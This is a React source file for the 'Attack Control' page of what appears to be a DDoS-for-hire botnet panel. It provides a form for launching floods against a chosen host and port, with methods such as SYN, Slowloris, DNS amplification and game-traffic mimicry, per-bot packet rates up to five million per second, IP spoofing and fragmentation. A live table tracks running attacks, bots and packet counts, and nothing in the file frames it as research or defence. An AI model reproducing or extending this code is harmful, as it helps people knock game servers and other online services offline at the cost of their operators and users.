import React, { useEffect, useState } from 'react';
import { api } from '../utils/api';
import { Crosshair, StopCircle, Zap, AlertTriangle } from 'lucide-react';

interface Attack { id: string; target_host: string; target_port: number; method: string; duration_secs: number; pps_per_bot: number; spoof_mode: number; fragmentation: boolean; mega_mode: boolean; status: string; bot_ids: string[]; total_packets: number; started_at: string | null; }

export default function Attack() {
  const [attacks, setAttacks] = useState<Attack[]>([]);
  const [form, setForm] = useState({ target_host: '', target_port: 80, method: 'UDP', duration_secs: 60, pps_per_bot: 100000, spoof_mode: 0, fragmentation: false, mega_mode: false });
  const [launching, setLaunching] = useState(false);
  const [err, setErr] = useState('');

  const fetch = async () => { try { const { data } = await api.get('/api/attacks/active'); setAttacks(data); } catch (e) {} };
  useEffect(() => { fetch(); const i = setInterval(fetch, 3000); return () => clearInterval(i); }, []);

  const launch = async () => { setLaunching(true); setErr(''); try { await api.post('/api/attacks/launch', form); fetch(); } catch (e: any) { setErr(e.response?.data?.detail || 'Failed'); } setLaunching(false); };
  const stop = async (id: string) => { await api.post(`/api/attacks/${id}/stop`); fetch(); };

  return (
    <div className="p-8 animate-fade-in">
      <div className="flex items-center justify-between mb-6"><div><h2 className="text-2xl font-bold">Attack Control</h2><p className="text-sm text-[var(--text-muted)] mt-1">Launch and manage attacks</p></div><div className="text-xs text-[var(--text-muted)]">{attacks.length} active</div></div>

      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-6 mb-8">
        <h3 className="text-sm font-semibold mb-5 flex items-center gap-2"><Crosshair className="w-4 h-4 text-red-400" />Launch Attack</h3>
        <div className="grid grid-cols-4 gap-4 mb-4">
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Target Host</label><input placeholder="game-server.com" className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs focus:outline-none focus:border-emerald-600 transition-colors" value={form.target_host} onChange={e => setForm(f => ({ ...f, target_host: e.target.value }))} /></div>
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Port</label><input type="number" min={1} max={65535} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs" value={form.target_port} onChange={e => setForm(f => ({ ...f, target_port: parseInt(e.target.value) }))} /></div>
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Method</label><select className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs text-[var(--text-primary)]" value={form.method} onChange={e => setForm(f => ({ ...f, method: e.target.value }))}><option>UDP</option><option>TCP</option><option>HTTP</option><option>SYN</option><option>ICMP</option><option>MIX</option><option>SLOWLORIS</option><option>TLS_EXHAUST</option><option>DNS_AMP</option><option>GAME_MIMIC</option><option>MEGA</option></select></div>
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Duration (s)</label><input type="number" min={1} max={3600} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs" value={form.duration_secs} onChange={e => setForm(f => ({ ...f, duration_secs: parseInt(e.target.value) }))} /></div>
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">PPS / Bot</label><input type="number" min={1000} max={5000000} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs" value={form.pps_per_bot} onChange={e => setForm(f => ({ ...f, pps_per_bot: parseInt(e.target.value) }))} /></div>
          <div><label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Spoof</label><select className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs text-[var(--text-primary)]" value={form.spoof_mode} onChange={e => setForm(f => ({ ...f, spoof_mode: parseInt(e.target.value) }))}><option value={0}>Off</option><option value={1}>VN IP</option><option value={2}>Random</option></select></div>
          <div className="flex items-end gap-4 pb-2.5">
            <label className="flex items-center gap-2 text-xs text-[var(--text-secondary)] cursor-pointer"><input type="checkbox" checked={form.fragmentation} onChange={e => setForm(f => ({ ...f, fragmentation: e.target.checked }))} />Frag</label>
            <label className="flex items-center gap-2 text-xs text-[var(--text-secondary)] cursor-pointer"><input type="checkbox" checked={form.mega_mode} onChange={e => setForm(f => ({ ...f, mega_mode: e.target.checked }))} />MEGA</label>
          </div>
          <div className="flex items-end">
            <button onClick={launch} disabled={launching || !form.target_host} className="w-full flex items-center justify-center gap-2 px-6 py-2.5 bg-red-600 hover:bg-red-700 disabled:opacity-50 rounded-xl text-xs font-semibold transition-colors"><Zap className="w-3.5 h-3.5" />{launching ? 'Launching...' : 'Launch'}</button>
          </div>
        </div>
        {err && <div className="text-xs text-red-400 mt-2 flex items-center gap-1.5"><AlertTriangle className="w-3 h-3" />{err}</div>}
      </div>

      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden">
        <div className="p-4 border-b border-[var(--border)] flex items-center justify-between"><h3 className="text-sm font-semibold">Active Attacks</h3><span className="text-xs text-[var(--text-muted)]">{attacks.length} running</span></div>
        <table className="w-full"><thead><tr className="border-b border-[var(--border)] text-left text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em]"><th className="p-4">Target</th><th className="p-4">Method</th><th className="p-4">Duration</th><th className="p-4">PPS</th><th className="p-4">Bots</th><th className="p-4">Packets</th><th className="p-4">Started</th><th className="p-4">Action</th></tr></thead>
        <tbody>{attacks.length === 0 ? <tr><td colSpan={8} className="p-12 text-center text-[var(--text-muted)]">No active attacks</td></tr> : attacks.map(a => (
          <tr key={a.id} className="border-b border-[var(--border)]/50">
            <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
            <td className="p-4"><span className="px-2 py-0.5 rounded text-[10px] font-medium bg-red-600/10 text-red-400 border border-red-600/20">{a.method}</span></td>
            <td className="p-4 text-xs text-[var(--text-secondary)]">{a.duration_secs}s</td>
            <td className="p-4 text-xs text-[var(--text-secondary)]">{a.pps_per_bot?.toLocaleString()}</td>
            <td className="p-4 text-xs text-[var(--text-secondary)]">{a.bot_ids?.length || 0}</td>
            <td className="p-4 text-xs font-mono text-[var(--text-secondary)]">{a.total_packets?.toLocaleString()}</td>
            <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleTimeString() : '—'}</td>
            <td className="p-4"><button onClick={() => stop(a.id)} className="p-2 hover:bg-red-600/10 rounded-lg text-red-400 transition-colors"><StopCircle className="w-3.5 h-3.5" /></button></td>
          </tr>
        ))}</tbody></table>
      </div>
    </div>
  );
}